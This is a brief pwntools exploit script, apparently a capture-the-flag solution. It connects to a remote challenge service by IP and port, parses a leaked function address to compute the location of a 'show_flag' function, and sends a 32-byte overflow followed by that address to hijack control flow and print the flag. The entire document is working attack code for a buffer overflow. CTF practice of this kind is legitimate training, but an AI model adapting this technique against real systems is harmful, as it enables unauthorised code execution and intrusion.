from pwn import *
context.binary = elf = ELF('./vuln')
s = remote('35.200.120.35', 9003)
s.recvuntil(b'|cry()   | ')
cry = int(s.recv(18), 16)
show_flag = cry - elf.symbols.my_monster_cry + elf.symbols.show_flag
s.sendline(b'a'*32+pack(show_flag))
s.recvuntil(b'Your Turn.\n')
print(s.recvline())
